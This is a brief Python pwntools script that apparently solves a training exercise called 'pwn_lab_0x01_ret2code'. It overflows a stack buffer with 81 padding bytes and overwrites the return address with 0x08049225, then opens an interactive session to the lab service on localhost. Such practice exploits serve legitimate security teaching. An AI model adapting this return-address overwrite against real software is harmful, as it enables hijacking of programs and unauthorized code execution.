from pwn import *

local = False
r = process("./pwn_lab_0x01_ret2code") if local else remote("localhost", 42014)

target = 0x08049225
p = b"a" * (77 + 4) + p32(target)
r.sendline(p)

r.interactive()